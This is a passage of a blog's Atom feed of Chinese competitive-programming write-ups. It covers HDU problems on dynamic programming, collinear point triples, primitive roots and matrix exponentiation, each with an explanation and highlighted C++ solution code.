class="line">                dp[i][j] = res;</div><div class="line">                change(ans, res);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=5064&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=5064&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;给定n个正整数，这n个数相加为M（0&amp;lt;M≤2^22）。问从这n个数选出一些数，从小到大排序，使得b2-b1≤b3-b2……≤bt-bt-1。求t的最大值&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;首先考虑解的结构一定是C1,C1……C2,C3……Cm。其中C1&amp;lt;C2&amp;lt;……&amp;lt;Cm。所以可以对ai去重后排序。可以知道此时的ai的个数为sqrt(M)级别的。&lt;br&gt;然后用dp[i][j]表示以aj结尾，ai为倒数第二个数的最优解。dp[i][j] = max(dp[k][i]) + 1, 其中ai-ak≤aj-ai&lt;br&gt;这样的复杂度是O(n^3),其中n为1000级别的，会TLE。&lt;br&gt;发现有一个优化：dp[i][j+1] = max(dp[k][i]) + 1, 其中ai-ak≤aj-ai&amp;lt;aj+1-ai。所以重复的部分只需要计算一次即可。这样复杂度降到O(n^2)&lt;/p&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="dp" scheme="http://yoursite.com/tags/dp/"/>
    
      <category term="LIS" scheme="http://yoursite.com/tags/LIS/"/>
    
  </entry>
  
  <entry>
    <title>HDU 5020 Revenge of Collinearity（n个点三点共线）</title>
    <link href="http://yoursite.com/2015/09/29/hdu5020/"/>
    <id>http://yoursite.com/2015/09/29/hdu5020/</id>
    <published>2015-09-29T07:50:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=5020" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=5020</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>给定n个点，问有多少个三点共线的三元组。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>以每个点为基点进行极角排序，统计三点共线的个数。<br><a id="more"></a></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1111</span>;</div><div class="line"><span class="keyword">int</span> x[N], y[N];</div><div class="line">pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; v[N];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> t, n, tot;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;t);</div><div class="line">    <span class="keyword">while</span>(t--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, x + i, y + i);</div><div class="line">        ll ans = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</div><div class="line">            tot = <span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) <span class="keyword">if</span> (i != j) &#123;</div><div class="line">                <span class="keyword">int</span> dx = x[i] - x[j], dy = y[i] - y[j];</div><div class="line">                <span class="keyword">int</span> d = __gcd(dx, dy);</div><div class="line">                dx /= d, dy /= d;</div><div class="line">                <span class="keyword">if</span> (dx != <span class="number">0</span> &amp;&amp; dy != <span class="number">0</span>) &#123;</div><div class="line">                    <span class="keyword">if</span> (dx &lt; <span class="number">0</span>) dx *= <span class="number">-1</span>, dy *= <span class="number">-1</span>;</div><div class="line">                &#125; <span class="keyword">else</span> dx = max(dx, -dx), dy = max(dy, -dy);</div><div class="line">                v[tot++] = make_pair(dx, dy);</div><div class="line">            &#125;</div><div class="line">            sort(v, v + tot);</div><div class="line">            <span class="keyword">int</span> now = <span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; tot; j++) &#123;</div><div class="line">                <span class="keyword">if</span> (j == <span class="number">0</span> || v[j] != v[j - <span class="number">1</span>]) now = j;</div><div class="line">                ans += j - now;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%I64d\n"</span>, ans / <span class="number">3</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=5020&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=5020&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;给定n个点，问有多少个三点共线的三元组。&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;以每个点为基点进行极角排序，统计三点共线的个数。&lt;br&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="计算几何" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E5%87%A0%E4%BD%95/"/>
    
      <category term="三点共线" scheme="http://yoursite.com/tags/%E4%B8%89%E7%82%B9%E5%85%B1%E7%BA%BF/"/>
    
  </entry>
  
  <entry>
    <title>HDU 4992 Primitive Roots（求一个数的所有原根）</title>
    <link href="http://yoursite.com/2015/09/25/hdu4992/"/>
    <id>http://yoursite.com/2015/09/25/hdu4992/</id>
    <published>2015-09-25T12:50:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=4992" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=4992</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>给定一个数n，求n的所有原根，按照从小到大输出，如果没有原根输出-1</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>原根的定义：g^d % p = 1 其中d最小为phi(p)，则g便为一个原根</p><ol><li><p>一个数是否有原根<br> 判断数是否有原根：模n有原根的充要条件是n = 1,2,4,p,2p,p^q，其中p是奇质数，q是任意正整数。</p></li><li><p>若有，找其最小原根<br>然后用欧拉公式求出n的m=φ(n)，从2~n-1遍历找出n的最小原根a：判断a^m % n==1 是否成立<br>计算出所有m的因子（1和m除外）y，若a^y % n==1，则a不可能是n的原根。因为存在性质：如果正整数gcd(a,m) = 1，正整数 d 满足a^d≡1(mod m)，则 d 整除 φ(m)。</p></li><li><p>已知一个原根，得到所有原根<br> 得到所有a^x % n {2&lt;=x&lt;m，gcd(x,m)==1}的值为n的原根<br> 证明：<a href="http://blog.csdn.net/solotzg/article/details/39205337" target="_blank" rel="external">http://blog.csdn.net/solotzg/article/details/39205337</a></p></li></ol><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000000</span></div><div class="line"><span class="keyword">int</span> ans[maxn + <span class="number">10</span>], valid[maxn + <span class="number">10</span>], tot = <span class="number">0</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPrime</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> &amp;tot, <span class="keyword">int</span> ans[])</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</div><div class="line">        <span class="keyword">if</span> (!valid[i]) ans[tot++] = i;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; tot &amp;&amp; i * ans[j] &lt;= n; j++) &#123;</div><div class="line">            valid[i * ans[j]] = <span class="number">1</span>;</div><div class="line">            <span class="keyword">if</span> (i % ans[j] == <span class="number">0</span>) <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">///判断是否有原根</span></div><div class="line"><span class="comment">///判断数是否有原根：模n有原根的充要条件是n = 1,2,4,p,2p,p^q，其中p是奇质数，q是任意正整数。</span></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">has_primitive_root</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">0</span>) n /= <span class="number">2</span>;</div><div class="line">    <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; ans[i] * ans[i] &lt;= n; i++) <span class="keyword">if</span> (n % ans[i] == <span class="number">0</span>)&#123;</div><div class="line">        <span class="keyword">while</span>(n % ans[i] == <span class="number">0</span>) n /= ans[i];</div><div class="line">        <span class="keyword">if</span> (n != <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">///得到最小的原根</span></div><div class="line"><span class="function">ll <span class="title">pow_mod</span><span class="params">(ll a, ll x, ll p)</span> </span>&#123;</div><div class="line">    ll res = <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span>(x) &#123;</div><div class="line">        <span class="keyword">if</span> (x &amp; <span class="number">1</span>) res = res * a % p;</div><div class="line">        x &gt;&gt;= <span class="number">1</span>;</div><div class="line">        a = a * a % p;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"><span class="function">ll <span class="title">euler</span><span class="params">(ll x)</span> </span>&#123;</div><div class="line">    ll res = x;</div><div class="line">    <span class="keyword">for</span> (ll i = <span class="number">0</span>; ans[i] * ans[i] &lt;= x; i++) <span class="keyword">if</span> (x % ans[i] == <span class="number">0</span>) &#123;</div><div class="line">        res = res / ans[i] * (ans[i] - <span class="number">1</span>);</div><div class="line">        <span class="keyword">while</span>(x % ans[i] == <span class="number">0</span>) x /= ans[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (x &gt; <span class="number">1</span>) res = res / x * (x - <span class="number">1</span>);</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"><span class="built_in">vector</span>&lt;ll&gt; a;</div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">g_test</span><span class="params">(ll g, ll p, ll fhi_n)</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span> (ll i = <span class="number">0</span>; i &lt; a.size(); i++)</div><div class="line">        <span class="keyword">if</span> (pow_mod(g, fhi_n / a[i], p) == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="function">ll <span class="title">primitive_root</span><span class="params">(ll p, ll fhi_n)</span> </span>&#123;</div><div class="line">    a.clear();</div><div class="line">    ll tmp = fhi_n;</div><div class="line">    <span class="keyword">for</span> (ll i = <span class="number">0</span>; ans[i] * ans[i] &lt;= tmp; i++) <span class="keyword">if</span> (tmp % ans[i] == <span class="number">0</span>) &#123; <span class="comment">//这里还可以用筛素数优化</span></div><div class="line">        a.push_back(ans[i]);</div><div class="line">        <span class="keyword">while</span>(tmp % ans[i] == <span class="number">0</span>) tmp /= ans[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (tmp != <span class="number">1</span>) a.push_back(tmp);</div><div class="line">    ll g = <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (pow_mod(g, fhi_n, p) != <span class="number">1</span>) &#123; <span class="comment">///要先判断g^fhi_n % p == 1</span></div><div class="line">            g++;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (g_test(g, p, fhi_n)) <span class="keyword">return</span> g;</div><div class="line">        g++;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">///根据最小原根得到所有原根</span></div><div class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; Getall_primitive_root(<span class="keyword">int</span> g, <span class="keyword">int</span> n, <span class="keyword">int</span> fhi_n) &#123;</div><div class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res;</div><div class="line">    res.pb(g);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; fhi_n; i++) &#123;</div><div class="line">        <span class="keyword">if</span> (__gcd(i, fhi_n) != <span class="number">1</span>) <span class="keyword">continue</span>;</div><div class="line">        res.pb(pow_mod(g, i, n));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    getPrime(maxn, tot, ans);</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n)) &#123;</div><div class="line">        <span class="keyword">if</span> (n == <span class="number">2</span>) &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"1"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (n == <span class="number">4</span>) &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"3"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (!has_primitive_root(n)) &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"-1"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        ll fhi_n = euler(n);</div><div class="line">        ll g = primitive_root(n, fhi_n);</div><div class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res = Getall_primitive_root(g, n, fhi_n);</div><div class="line">        sort(res.begin(), res.end());</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res.size(); i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d%c"</span>, res[i], i == res.size() - <span class="number">1</span> ? <span class="string">'\n'</span> : <span class="string">' '</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=4992&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=4992&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;给定一个数n，求n的所有原根，按照从小到大输出，如果没有原根输出-1&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;原根的定义：g^d % p = 1 其中d最小为phi(p)，则g便为一个原根&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;一个数是否有原根&lt;br&gt; 判断数是否有原根：模n有原根的充要条件是n = 1,2,4,p,2p,p^q，其中p是奇质数，q是任意正整数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;若有，找其最小原根&lt;br&gt;然后用欧拉公式求出n的m=φ(n)，从2~n-1遍历找出n的最小原根a：判断a^m % n==1 是否成立&lt;br&gt;计算出所有m的因子（1和m除外）y，若a^y % n==1，则a不可能是n的原根。因为存在性质：如果正整数gcd(a,m) = 1，正整数 d 满足a^d≡1(mod m)，则 d 整除 φ(m)。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;已知一个原根，得到所有原根&lt;br&gt; 得到所有a^x % n {2&amp;lt;=x&amp;lt;m，gcd(x,m)==1}的值为n的原根&lt;br&gt; 证明：&lt;a href=&quot;http://blog.csdn.net/solotzg/article/details/39205337&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/solotzg/article/details/39205337&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="数学" scheme="http://yoursite.com/tags/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="原根" scheme="http://yoursite.com/tags/%E5%8E%9F%E6%A0%B9/"/>
    
  </entry>
  
  <entry>
    <title>HDU 4990 Reading comprehension（分奇偶讨论+矩阵快速幂）</title>
    <link href="http://yoursite.com/2015/09/25/hdu4990/"/>
    <id>http://yoursite.com/2015/09/25/hdu4990/</id>
    <published>2015-09-25T04:50:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=4990" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=4990</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>给定n，按照以下程序算出ans。（n为int）<br>    ans=0;<br>    for(i=1;i&lt;=n;i++)<br>    {<br>      if(i&amp;1)ans=(ans<em>2+1)%m;<br>      else ans=ans</em>2%m;<br>    }<br>    printf(“%d\n”,ans);</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>分奇偶讨论<br>当n为奇数时：fn=4<em>fn-1 + 1，首项为1<br>当n为偶数时：fn=4</em>fn-1 + 2，首项为2<br>之后就矩阵快速幂加速运算即可。</p><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 1 &lt;&lt; 30</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxm = <span class="number">2</span>;</div><div class="line">ll mod;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Matrix</span> &#123;</span></div><div class="line">    <span class="keyword">int</span> n, m;</div><div class="line">    ll a[maxn][maxm];</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</div><div class="line">        n = m = <span class="number">0</span>;</div><div class="line">        <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="keyword">sizeof</span>(a));</div><div class="line">    &#125;</div><div class="line">    Matrix <span class="keyword">operator</span> * (<span class="keyword">const</span> Matrix &amp;b) <span class="keyword">const</span> &#123; <span class="comment">//实现矩阵乘法</span></div><div class="line">        Matrix tmp;</div><div class="line">        tmp.n = n;</div><div class="line">        tmp.m = b.m;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i 